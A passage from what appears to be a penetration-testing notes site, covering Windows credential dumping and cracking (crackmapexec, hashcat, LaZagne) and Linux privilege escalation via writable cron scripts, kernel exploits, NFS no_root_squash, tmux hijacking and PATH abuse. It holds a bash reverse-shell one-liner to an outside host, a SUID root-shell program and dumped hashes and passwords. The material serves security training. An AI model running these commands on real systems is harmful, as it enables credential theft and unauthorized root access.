starting...\n\n&lt;SNIP&gt;\n\nDictionary cache hit:\n* Filename..: /usr/share/wordlists/rockyou.txt\n* Passwords.: 14344385\n* Bytes.....: 139921507\n* Keyspace..: 14344385\n\nf7eb9c06fafaa23c4bcf22ba6781c1e2:dragon          \n6f8c3f4d3869a10f3b4f0522f537fd33:iloveme         \n184ecdda8cf1dd238d438c4aea4d560d:adrian          \n31d6cfe0d16ae931b73c59d7e0c089c0:                \n\nSession..........: hashcat\nStatus...........: Cracked\nHash.Name........: NTLM\nHash.Target......: dumpedhashes.txt\nTime.Started.....: Tue Dec 14 14:16:56 2021 (0 secs)\nTime.Estimated...: Tue Dec 14 14:16:56 2021 (0 secs)\nGuess.Base.......: File (/usr/share/wordlists/rockyou.txt)\nGuess.Queue......: 1/1 (100.00%)\nSpeed.#1.........:    14284 H/s (0.63ms) @ Accel:1024 Loops:1 Thr:1 Vec:8\nRecovered........: 5/5 (100.00%) Digests\nProgress.........: 8192/14344385 (0.06%)\nRejected.........: 0/8192 (0.00%)\nRestore.Point....: 4096/14344385 (0.03%)\nRestore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1\nCandidates.#1....: newzealand -&gt; whitetiger\n\nStarted: Tue Dec 14 14:16:50 2021\nStopped: Tue Dec 14 14:16:58 2021\n</code></pre></p>  Remote Dumping &amp; LSA Secrets Considerations <p>With access to credentials with local admin privileges, it is also possible for us to target LSA Secrets over the network. This could allow to extract credentials from a running service, scheduled task, or application that uses LSA secrets to store passwords.</p> <p>Dumping LSA Secrets Remotely <pre><code>secops@kali[/kali]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p 32i4h234o234sd --lsa\n\nSMB         10.129.42.198   445    WS01     [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:False)\nSMB         10.129.42.198   445    WS01     [+] WS01\\bob:32i4h234o234sd(Pwn3d!)\nSMB         10.129.42.198   445    WS01     [+] Dumping LSA secrets\nSMB         10.129.42.198   445    WS01     WS01\\worker:Hello123\nSMB         10.129.42.198   445    WS01      dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce\ndpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a\nSMB         10.129.42.198   445    WS01     NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488b\nSMB         10.129.42.198   445    WS01     [+] Dumped 3 LSA secrets to /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.secrets and /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.cached\n</code></pre></p> <p>We can also dump hashes from the SAM database remotely. <pre><code>secops@kali[/kali]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p 32i4h234o234sd --sam\n\nSMB         10.129.42.198   445    WS01      [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:WS01) (signing:False) (SMBv1:False)\nSMB         10.129.42.198   445    WS01      [+] FRONTDESK01\\bob:32i4h234o234sd(Pwn3d!)\nSMB         10.129.42.198   445    WS01      [+] Dumping SAM hashes\nSMB         10.129.42.198   445    WS01      Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nSMB         10.129.42.198   445    WS01     Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nSMB         10.129.42.198   445    WS01     DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nSMB         10.129.42.198   445    WS01     WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::\nSMB         10.129.42.198   445    WS01     bob:1001:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::\nSMB         10.129.42.198   445    WS01     sam:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::\nSMB         10.129.42.198   445    WS01     rocky:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::\nSMB         10.129.42.198   445    WS01     worker:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::\nSMB         10.129.42.198   445    WS01     [+] Added 8 SAM hashes to the database\n</code></pre></p>","title":"Attacking Sam"},{"location":"password_attacks/windows_local_password_attacks/credential_hunting/","text":"<p>Key Terms to Search</p>           Passwords Passphrases Keys   Username User account Creds   Users Passkeys Passphrases   configuration dbcredential dbpassword   pwd Login Credentials     Search Tools <p>We can also take advantage of tools like Lazagne to quickly discover credentials that web browsers or other installed applications may insecurely store.</p> <pre><code>C:\\Users\\bob\\Desktop&gt; start lazagne.exe all\n</code></pre> <p>Lazagne Output <pre><code>|====================================================================|\n|                                                                    |\n|                        The LaZagne Project                         |\n|                                                                    |\n|                          ! BANG BANG !                             |\n|                                                                    |\n|====================================================================|\n\n\n########## User: bob ##########\n\n------------------- Winscp passwords -----------------\n\n[+] Password found !!!\nURL: 10.129.202.51\nLogin: admin\nPassword: SteveisReallyCool123\nPort: 22\n</code></pre></p> <p>findstr to search from patterns across many types of files. Keeping in mind common key terms, we can use variations of this command to discover credentials on a Windows target:</p> <pre><code>C:\\&gt; findstr /SIM /C:\"password\" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml\n</code></pre>  Additional Considerations <p>There are thousands of tools &amp; key terms we could use to hunt for credentials on Windows operating systems. Know that which ones we choose to use will be primarily based on the function of the computer. If we land on a Windows Server OS, we may use a different approach than if we land on a Windows Desktop OS. Always be mindful of how the system is being used, and this will help us know where to look. Sometimes we may even be able to find credentials by navigating and listing directories on the file system as our tools run.</p> <p>Here are some other places we should keep in mind when credential hunting:</p> <ul> <li>Passwords in Group Policy in the SYSVOL share</li> <li>Passwords in scripts in the SYSVOL share</li> <li>Password in scripts on IT shares</li> <li>Passwords in web.config files on dev machines and IT shares</li> <li>unattend.xml</li> <li>Passwords in the AD user or computer description fields</li> <li>KeePass databases --&gt; pull hash, crack and get loads of access.</li> <li>Found on user systems and shares</li> <li>Files such as pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, Sharepoint </li> </ul>","title":"Credential Hunting"},{"location":"privesc/linux/credential_hunting/","text":"<p>Credentials may be found in configuration files (<code>.conf</code>, <code>.config</code>, <code>.xml</code>, etc.), shell scripts, a user's bash history file, backup (<code>.bak</code>) files, within database files or even in text files.</p> <p>The /var directory typically contains the web root for whatever web server is running on the host.</p> <pre><code>xyz_student@NIX02:~$ cat wp-config.php | grep 'DB_USER\\|DB_PASSWORD'\n\ndefine( 'DB_USER', 'wordpressuser' );\ndefine( 'DB_PASSWORD', 'WPadmin123!' );\n</code></pre> <p>The spool or mail directories, if accessible, may also contain valuable information or even credentials. It is common to find credentials stored in files in the web root (i.e. MySQL connection strings, WordPress configuration files).</p> <pre><code>xyz_student@NIX02:~$  find / ! -path \"*/proc/*\" -iname \"*config*\" -type f 2&gt;/dev/null\n\n/etc/ssh/ssh_config\n/etc/ssh/sshd_config\n/etc/python3/debian_config\n/etc/kbd/config\n/etc/manpath.config\n/boot/config-4.4.0-116-generic\n/boot/grub/i386-pc/configfile.mod\n/sys/devices/pci0000:00/0000:00:00.0/config\n/sys/devices/pci0000:00/0000:00:01.0/config\n&lt;SNIP&gt;\n</code></pre> <p>Whenever finding SSH keys check the <code>known_hosts</code> file to find targets. This file contains a list of public keys for all the hosts which the user has connected to in the past and may be useful for lateral movement or to find data on a remote host that can be used to perform privilege escalation on our target.</p> <pre><code>xyz_student@NIX02:~$  ls ~/.ssh\n\nid_rsa  id_rsa.pub  known_hosts\n</code></pre>","title":"Credential Hunting"},{"location":"privesc/linux/cron_jobs/","text":"<p>Look around the system for any writeable files or directories. The file <code>backup.sh</code> in the <code>/dmz-backups</code> directory is interesting and seems like it could be running on a cron job.</p> <pre><code>secops@kali[/kali]$ find / -path /proc -prune -o -type f -perm -o+w 2&gt;/dev/null\n\n/etc/cron.daily/backup\n/dmz-backups/backup.sh\n/proc\n/sys/fs/cgroup/memory/init.scope/cgroup.event_control\n\n&lt;SNIP&gt;\n/home/backupsvc/backup.sh\n\n&lt;SNIP&gt;\n</code></pre> <p>A quick look in the <code>/dmz/backups</code> directory shows what appears to be files created every three minutes. This seems to be a major misconfiguration. Perhaps the sysadmin meant to specify every three hours like <code>0 */3 * * *</code> but instead wrote <code>*/3 * * * *</code>, which tells the cron job to run every three minutes. The second issue is that the <code>backup.sh</code> shell script is world writeable and runs as root.</p> <pre><code>secops@kali[/kali]$ ls -la /dmz-backups/\n\ntotal 36\ndrwxrwxrwx  2 root root 4096 Aug 31 02:39 .\ndrwxr-xr-x 24 root root 4096 Aug 31 02:24 ..\n-rwxrwxrwx  1 root root  230 Aug 31 02:39 backup.sh\n-rw-r--r--  1 root root 3336 Aug 31 02:24 www-backup-2020831-02:24:01.tgz\n-rw-r--r--  1 root root 3336 Aug 31 02:27 www-backup-2020831-02:27:01.tgz\n-rw-r--r--  1 root root 3336 Aug 31 02:30 www-backup-2020831-02:30:01.tgz\n-rw-r--r--  1 root root 3336 Aug 31 02:33 www-backup-2020831-02:33:01.tgz\n-rw-r--r--  1 root root 3336 Aug 31 02:36 www-backup-2020831-02:36:01.tgz\n-rw-r--r--  1 root root 3336 Aug 31 02:39 www-backup-2020831-02:39:01.tgz\n</code></pre> <p>We can confirm that a cron job is running using pspy, a command-line tool used to view running processes without the need for root privileges. We can use it to see commands run by other users, cron jobs, etc. It works by scanning procfs.</p> <p>Let's run <code>pspy</code> and have a look. The <code>-pf</code> flag tells the tool to print commands and file system events and <code>-i 1000</code> tells it to scan profcs every 1000ms (or every second).</p> <pre><code>secops@kali[/kali]$ ./pspy64 -pf -i 1000\n\npspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855\n\n\n     \u2588\u2588\u2593\u2588\u2588\u2588    \u2588\u2588\u2588\u2588\u2588\u2588  \u2588\u2588\u2593\u2588\u2588\u2588 \u2593\u2588\u2588   \u2588\u2588\u2593\n    \u2593\u2588\u2588\u2591  \u2588\u2588\u2592\u2592\u2588\u2588    \u2592 \u2593\u2588\u2588\u2591  \u2588\u2588\u2592\u2592\u2588\u2588  \u2588\u2588\u2592\n    \u2593\u2588\u2588\u2591 \u2588\u2588\u2593\u2592\u2591 \u2593\u2588\u2588\u2584   \u2593\u2588\u2588\u2591 \u2588\u2588\u2593\u2592 \u2592\u2588\u2588 \u2588\u2588\u2591\n    \u2592\u2588\u2588\u2584\u2588\u2593\u2592 \u2592  \u2592   \u2588\u2588\u2592\u2592\u2588\u2588\u2584\u2588\u2593\u2592 \u2592 \u2591 \u2590\u2588\u2588\u2593\u2591\n    \u2592\u2588\u2588\u2592 \u2591  \u2591\u2592\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592\u2592\u2588\u2588\u2592 \u2591  \u2591 \u2591 \u2588\u2588\u2592\u2593\u2591\n    \u2592\u2593\u2592\u2591 \u2591  \u2591\u2592 \u2592\u2593\u2592 \u2592 \u2591\u2592\u2593\u2592\u2591 \u2591  \u2591  \u2588\u2588\u2592\u2592\u2592 \n    \u2591\u2592 \u2591     \u2591 \u2591\u2592  \u2591 \u2591\u2591\u2592 \u2591     \u2593\u2588\u2588 \u2591\u2592\u2591 \n    \u2591\u2591       \u2591  \u2591  \u2591  \u2591\u2591       \u2592 \u2592 \u2591\u2591  \n                   \u2591           \u2591 \u2591     \n                               \u2591 \u2591     \n\nConfig: Printing events (colored=true): processes=true | file-system-events=true ||| Scannning for processes every 1s and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)\nDraining file system events due to startup...\ndone\n2020/09/04 20:45:03 CMD: UID=0    PID=999    | /usr/bin/VGAuthService \n2020/09/04 20:45:03 CMD: UID=111  PID=990    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation \n2020/09/04 20:45:03 CMD: UID=0    PID=99     | \n2020/09/04 20:45:03 CMD: UID=0    PID=988    | /usr/lib/snapd/snapd \n\n&lt;SNIP&gt;\n\n2020/09/04 20:45:03 CMD: UID=0    PID=1017   | /usr/sbin/cron -f \n2020/09/04 20:45:03 CMD: UID=0    PID=1010   | /usr/sbin/atd -f \n2020/09/04 20:45:03 CMD: UID=0    PID=1003   | /usr/lib/accountsservice/accounts-daemon \n2020/09/04 20:45:03 CMD: UID=0    PID=1001   | /lib/systemd/systemd-logind \n2020/09/04 20:45:03 CMD: UID=0    PID=10     | \n2020/09/04 20:45:03 CMD: UID=0    PID=1      | /sbin/init \n2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive\n2020/09/04 20:46:01 CMD: UID=0    PID=2201   | /bin/bash /dmz-backups/backup.sh \n2020/09/04 20:46:01 CMD: UID=0    PID=2200   | /bin/sh -c /dmz-backups/backup.sh \n2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache\n2020/09/04 20:46:01 CMD: UID=0    PID=2199   | /usr/sbin/CRON -f \n2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive\n2020/09/04 20:46:01 CMD: UID=0    PID=2203   | \n2020/09/04 20:46:01 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive\n2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive\n2020/09/04 20:46:01 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive\n2020/09/04 20:46:01 CMD: UID=0    PID=2204   | tar --absolute-names --create --gzip --file=/dmz-backups/www-backup-202094-20:46:01.tgz /var/www/html \n2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive\n2020/09/04 20:46:01 CMD: UID=0    PID=2205   | gzip \n2020/09/04 20:46:03 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive\n2020/09/04 20:46:03 CMD: UID=0    PID=2206   | /bin/bash /dmz-backups/backup.sh \n2020/09/04 20:46:03 FS:        CLOSE_NOWRITE | /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache\n2020/09/04 20:46:03 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive\n</code></pre> <p>We can see that a cron job runs the <code>backup.sh</code> script located in the <code>/dmz-backups</code> directory and creating a tarball file of the contents of the <code>/var/www/html</code> directory.</p> <p>We can look at the shell script and append a command to it to attempt to obtain a reverse shell as root. We should also attempt to append our commands to the end of the script.</p> <pre><code>secops@kali[/kali]$ cat /dmz-backups/backup.sh \n\n#!/bin/bash\n SRCDIR=\"/var/www/html\"\n DESTDIR=\"/dmz-backups/\"\n FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz\n tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR\n</code></pre> <p>Let's modify the script to add a Bash one-liner reverse shell.</p> <pre><code>#!/bin/bash\nSRCDIR=\"/var/www/html\"\nDESTDIR=\"/dmz-backups/\"\nFILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz\ntar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR\n\nbash -i &gt;&amp; /dev/tcp/10.10.14.3/443 0&gt;&amp;1\n</code></pre> <p>Stand up a local <code>netcat</code> listener, and wait 3 minutes.</p> <pre><code>secops@kali[/kali]$ nc -lnvp 443\n\nlistening on [any] 443 ...\nconnect to [10.10.14.3] from (UNKNOWN) [10.129.2.12] 38882\nbash: cannot set terminal process group (9143): Inappropriate ioctl for device\nbash: no job control in this shell\n\nroot@NIX02:~# id\nid\nuid=0(root) gid=0(root) groups=0(root)\n\nroot@NIX02:~# hostname\nhostname\nNIX02\n</code></pre> <p>While not the most common attack, we do find poorly configured cron jobs that can be abused from time to time.</p>","title":"Cron Jobs"},{"location":"privesc/linux/enumeration/","text":"<p><code>OS Version</code></p> <ul> <li>Knowing the distribution will give an idea of the types of tools that may be available</li> <li>Identify the OS version, for which there may be public exploits available</li> </ul> <p><code>Kernel Version</code></p> <ul> <li>There may be public exploits that target a vulnerability in a specific kernel version</li> </ul> <p><code>Running Services</code></p> <ul> <li>A misconfigured or vulnerable service running as root can be an easy win for privilege escalation</li> <li>Flaws have been discovered in many common services such as Nagios, Exim, Samba, ProFTPd, etc.</li> </ul> <p>List current processes <pre><code>secops@kali[/kali]$ ps aux | grep root\n\nroot         1  1.3  0.1  37656  5664 ?        Ss   23:26   0:01 /sbin/init\nroot         2  0.0  0.0      0     0 ?        S    23:26   0:00 [kthreadd]\nroot         3  0.0  0.0      0     0 ?        S    23:26   0:00 [ksoftirqd/0]\n&lt;SNIP&gt;\n</code></pre></p> <p><code>Installed Packages and Versions</code></p> <ul> <li>Important to check for any out-of-date or vulnerable packages that may be easily leveraged for privilege escalation</li> </ul> <p><code>Logged in Users</code></p> <ul> <li>Knowing which other users are logged into the system and what they are doing can give greater into possible local lateral movement and privilege escalation paths</li> </ul> <p>List current processes <pre><code>secops@kali[/kali]$ ps au\n\nUSER            PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nroot            1256  0.0  0.1  65832  3364 tty1     Ss   23:26   0:00 /bin/login --\ncliff.moore     1322  0.0  0.1  22600  5160 tty1     S    23:26   0:00 -bash\nshared          1367  0.0  0.1  22568  5116 pts/0    Ss   23:27   0:00 -bash\nroot            1384  0.0  0.1  52700  3812 tty1     S    23:29   0:00 sudo su\nroot            1385  0.0  0.1  52284  3448 tty1     S    23:29   0:00 su\nroot            1386  0.0  0.1  21224  3764 tty1     S+   23:29   0:00 bash\nshared          1397  0.0  0.1  37364  3428 pts/0    R+   23:30   0:00 ps au\n</code></pre></p> <p><code>User Home Directories</code></p> <ul> <li>Are other user's home directories accessible?</li> <li>User home folders may also contain SSH keys that can be used to access other systems or scripts and configuration files containing credentials.</li> <li>Not uncommon to find files containing credentials that can be leveraged to access other systems or even gain entry into the Active Directory environment.</li> </ul> <p>Bash History <pre><code>secops@kali[/kali]$ history\n\n    1  id\n    2  cd /home/cliff.moore\n    3  exit\n    4  touch backup.sh\n    5  tail /var/log/apache2/error.log\n    6  ssh ec2-user@dmz02.legalcorp.local\n    7  history\n</code></pre></p> <p><code>Sudo Privileges</code></p> <ul> <li>Can the user run any commands either as another user or as root?</li> <li>Often sudoer entries include <code>NOPASSWD</code>, meaning that the user can run the specified command without being prompted for a password</li> <li>Not uncommon to gain access as a user with full sudo privileges</li> <li><code>sudo su</code> will immediately give a root session</li> </ul> <p>Sudo - List User's Privileges <pre><code>secops@kali[/kali]$ sudo -l\n\nMatching Defaults entries for sysadm on NIX02:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser sysadm may run the following commands on NIX02:\n    (root) NOPASSWD: /usr/sbin/tcpdump\n</code></pre></p> <p><code>Configuration Files</code></p> <ul> <li>Can hold a wealth of information</li> <li>Search for <code>.conf</code> and <code>.config,</code> for usernames, passwords, and other secrets</li> </ul> <p><code>Readable Shadow File</code></p> <ul> <li>If the shadow file is readable, you will be able to gather password hashes for all users who have a password set</li> <li>These hashes can be subjected to an offline brute-force attack</li> </ul> <p><code>Password Hashes in /etc/passwd</code></p> <ul> <li>Occasionally, password hashes directly in the /etc/passwd file</li> <li>Can be subjected to an offline password cracking attack</li> <li>Can sometimes be seen on embedded devices and routers</li> </ul> <p><code>Cron Jobs</code></p> <ul> <li>Similar to Windows scheduled tasks</li> <li>often set up to perform maintenance and backup tasks</li> <li>With other misconfigurations such as relative paths or weak permissions, they can leverage to escalate privileges when the scheduled cron job runs</li> </ul> <pre><code>secops@kali[/kali]$ ls -la /etc/cron.daily/\n\ntotal 60\ndrwxr-xr-x  2 root root 4096 Aug 30 23:49 .\ndrwxr-xr-x 93 root root 4096 Aug 30 23:47 ..\n-rwxr-xr-x  1 root root  376 Mar 31  2016 apport\n-rwxr-xr-x  1 root root 1474 Sep 26  2017 apt-compat\n-rwx--x--x  1 root root  379 Aug 30 23:49 backup\n-rwxr-xr-x  1 root root  355 May 22  2012 bsdmainutils\n-rwxr-xr-x  1 root root 1597 Nov 27  2015 dpkg\n-rwxr-xr-x  1 root root  372 May  6  2015 logrotate\n-rwxr-xr-x  1 root root 1293 Nov  6  2015 man-db\n-rwxr-xr-x  1 root root  539 Jul 16  2014 mdadm\n-rwxr-xr-x  1 root root  435 Nov 18  2014 mlocate\n-rwxr-xr-x  1 root root  249 Nov 12  2015 passwd\n-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder\n-rwxr-xr-x  1 root root 3449 Feb 26  2016 popularity-contest\n-rwxr-xr-x  1 root root  214 May 24  2016 update-notifier-common\n</code></pre> <p><code>Unmounted File Systems and Additional Drives</code></p> <ul> <li>May find sensitive files, passwords, or backups that can be leveraged to escalate privileges</li> </ul> <pre><code>secops@kali[/kali]$ lsblk\n\nNAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT\nsda      8:0    0   30G  0 disk \n\u251c\u2500sda1   8:1    0   29G  0 part /\n\u251c\u2500sda2   8:2    0    1K  0 part \n\u2514\u2500sda5   8:5    0  975M  0 part [SWAP]\nsr0     11:0    1  848M  0 rom  \n</code></pre> <p><code>SETUID and SETGID Permissions</code></p> <ul> <li>Binaries are set with these permissions to allow a user to run a command as root, without having to grand root-level access to the user</li> <li>Many binaries contain functionality that can be exploited to get a root shell</li> </ul> <p><code>Writeable Directories</code></p> <ul> <li>Important to discover which directories are writeable if you need to download tools to the system</li> <li>May discover a writeable directory where a cron job places files, which provides an idea of how often the cron job runs and could be used to elevate privileges if the script that the cron job runs is also writeable</li> </ul> <p>Find writeable directories <pre><code>secops@kali[/kali]$ find / -path /proc -prune -o -type d -perm -o+w 2&gt;/dev/null\n\n/dmz-backups\n/tmp\n/tmp/VMwareDnD\n/tmp/.XIM-unix\n/tmp/.Test-unix\n/tmp/.X11-unix\n/tmp/systemd-private-8a2c51fcbad240d09578916b47b0bb17-systemd-timesyncd.service-TIecv0/tmp\n/tmp/.font-unix\n/tmp/.ICE-unix\n/proc\n/dev/mqueue\n/dev/shm\n/var/tmp\n/var/tmp/systemd-private-8a2c51fcbad240d09578916b47b0bb17-systemd-timesyncd.service-hm6Qdl/tmp\n/var/crash\n/run/lock\n</code></pre></p> <p><code>Writeable Files</code></p> <ul> <li>Are any scripts or configuration files world-writable?</li> <li>While altering configuration files can be extremely destructive, there may be instances where a minor modification can open up further access</li> <li>Any scripts that are run as root using cron jobs can be modified slightly to append a command</li> </ul> <p>Find Writable Files <pre><code>secops@kali[/kali]$ find / -path /proc -prune -o -type f -perm -o+w 2&gt;/dev/null\n\n/etc/cron.daily/backup\n/dmz-backups/backup.sh\n/proc\n/sys/fs/cgroup/memory/init.scope/cgroup.event_control\n\n&lt;SNIP&gt;\n\n/home/backupsvc/backup.sh\n\n&lt;SNIP&gt;\n</code></pre></p>","title":"Enumeration"},{"location":"privesc/linux/kernel_exploits/","text":"<p>Privilege escalation using a kernel exploit can be as simple as downloading, compiling, and running it. Some of these exploits work out of the box, while others require modification.</p>  <p>Note: Kernel exploits can cause system instability so use caution when running these against a production system.</p>  <p>Start by checking the Kernel level and Linux OS version. <pre><code>secops@kali[/kali]$ uname -a\n\nLinux NIX02 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux\n</code></pre></p> <pre><code>secops@kali[/kali]$ cat /etc/lsb-release \n\nDISTRIB_ID=Ubuntu\nDISTRIB_RELEASE=16.04\nDISTRIB_CODENAME=xenial\nDISTRIB_DESCRIPTION=\"Ubuntu 16.04.4 LTS\"\n</code></pre> <p>We can see that we are on Linux Kernel 4.4.0-116 on an Ubuntu 16.04.4 LTS box. A quick Google search for <code>linux 4.4.0-116-generic exploit</code> comes up with this exploit PoC. Next download, it to the system using <code>wget</code> or another file transfer method. We can compile the exploit code using gcc and set the executable bit using <code>chmod +x</code>.</p> <pre><code>secops@kali[/kali]$ gcc kernel_expoit.c -o kernel_expoit &amp;&amp; chmod +x kernel_expoit\n</code></pre> <p>Run the exploit and hopefully get dropped into a root shell. <pre><code>secops@kali[/kali]$ ./kernel_expoit \n\ntask_struct = ffff8800b71d7000\nuidptr = ffff8800b95ce544\nspawning root shell\n</code></pre></p> <p>Confirm root access to the box. <pre><code>root@xyz[/xyz]# whoami\n\nroot\n</code></pre></p>","title":"Kernel Exploits"},{"location":"privesc/linux/misc_techniques/","text":"Passive Traffic Capture <p>If <code>tcpdump</code> is installed, unprivileged users may be able to capture network traffic, including, in some cases, credentials passed in cleartext. Several tools exist, such as net-creds and PCredz that can be used to examine data.</p>  Weak NFS Privileges <pre><code>secops@kali[/kali]$ showmount -e 10.129.2.12\n\nExport list for 10.129.2.12:\n/tmp             *\n/var/nfs/general *\n</code></pre> <p>When an NFS volume is created, various options can be set:</p>    Option Description     <code>root_squash</code> If the root user is used to access NFS shares, it will be changed to the <code>nfsnobody</code> user, which is an unprivileged account. Any files created and uploaded by the root user will be owned by the <code>nfsnobody</code> user, which prevents an attacker from uploading binaries with the SUID bit set.   <code>no_root_squash</code> Remote users connecting to the share as the local root user will be able to create files on the NFS server as the root user. This would allow for the creation of malicious scripts/programs with the SUID bit set.    <pre><code>xyz@NIX02:~$ cat /etc/exports\n\n# /etc/exports: the access control list for filesystems which may be exported\n#       to NFS clients.  See exports(5).\n#\n# Example for NFSv2 and NFSv3:\n# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)\n#\n# Example for NFSv4:\n# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)\n# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)\n#\n/var/nfs/general *(rw,no_root_squash)\n/tmp *(rw,no_root_squash)\n</code></pre> <p>For example, we can create a SETUID binary that executes <code>/bin/sh</code> using our local root user. We can then mount the <code>/tmp</code> directory locally, copy the root-owned binary over to the NFS server, and set the SUID bit.</p> <p>First, create a simple binary, mount the directory locally, copy it, and set the necessary permissions.</p> <pre><code>xyz@NIX02:~$ cat shell.c \n\n#include &lt;stdio.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;unistd.h&gt;\nint main(void)\n{\n  setuid(0); setgid(0); system(\"/bin/bash\");\n}\n</code></pre> <pre><code>xyz@NIX02:/tmp$ gcc shell.c -o shell\n</code></pre> <pre><code>xyz@NIX02:/tmp$ sudo mount -t nfs 10.129.2.12:/tmp /mnt\nxyz@NIX02:/tmp$ cp shell /mnt\nxyz@NIX02:/tmp$ chmod u+s /mnt/shell\n</code></pre> <p>When we switch back to the host's low privileged session, we can execute the binary and obtain a root shell. <pre><code>xyz@NIX02:/tmp$  ls -la\n\ntotal 68\ndrwxrwxrwt 10 root  root   4096 Sep  1 06:15 .\ndrwxr-xr-x 24 root  root   4096 Aug 31 02:24 ..\ndrwxrwxrwt  2 root  root   4096 Sep  1 05:35 .font-unix\ndrwxrwxrwt  2 root  root   4096 Sep  1 05:35 .ICE-unix\n-rwsr-xr-x  1 root  root  16712 Sep  1 06:15 shell\n&lt;SNIP&gt;\n</code></pre></p> <pre><code>xyz@NIX02:/tmp$ ./shell\nroot@NIX02:/tmp# id\n\nuid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1000(xyz)\n</code></pre>  Hijacking Tmux Sessions <p>Terminal multiplexers such as tmux can be used to allow multiple terminal sessions to be accessed within a single console session. When not working in a <code>tmux</code> window, we can detach from the session, still leaving it active (i.e., running an <code>nmap</code> scan). For many reasons, a user may leave a <code>tmux</code> process running as a privileged user, such as root set up with weak permissions, and can be hijacked. This may be done with the following commands to create a new shared session and modify the ownership.</p> <pre><code>xyz@NIX02:~$ tmux -S /shareds new -s debugsess\nxyz@NIX02:~$ chown root:devs /shareds\n</code></pre> <p>If we can compromise a user in the <code>dev</code> group, we can attach to this session and gain root access.</p> <p>Check for any running <code>tmux</code> processes.</p> <pre><code>xyz@NIX02:~$  ps aux | grep tmux\n\nroot      4806  0.0  0.1  29416  3204 ?        Ss   06:27   0:00 tmux -S /shareds new -s debugsess\n</code></pre> <p>Confirm permissions <pre><code>xyz@NIX02:~$ ls -la /shareds \n\nsrw-rw---- 1 root devs 0 Sep  1 06:27 /shareds\n</code></pre></p> <p>Review our group membership <pre><code>xyz@NIX02:~$ id\n\nuid=1000(xyz) gid=1000(xyz) groups=1000(xyz),1011(devs)\n</code></pre></p> <p>Attach to the <code>tmux</code> session and confirm root privileges</p> <pre><code>xyz@NIX02:~$ tmux -S /shareds\n\nid\n\nuid=0(root) gid=0(root) groups=0(root)\n</code></pre>","title":"Miscellaneous Techniques"},{"location":"privesc/linux/path_abuse/","text":"<p>PATH is an environment variable that specifies the set of directories where an executable can be located. An account's PATH variable is a set of absolute paths, allowing a user to type a command without specifying the absolute path to the binary.</p> <pre><code>xyz_student@NIX02:~$ echo $PATH\n\n/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games\n</code></pre> <p>Adding <code>.</code> to a user's PATH adds their current working directory to the list. For example, if we can modify a user's path, we could replace a common binary such as <code>ls</code> with a malicious script such as a reverse shell. If we add <code>.</code> to the path by issuing the command <code>PATH=.:$PATH</code> and then <code>export PATH</code>, we will be able to run binaries located in our current working directory by just typing the name of the file (i.e. just typing <code>ls</code> will call the malicious script named <code>ls</code> in the current working directory instead of the binary located at 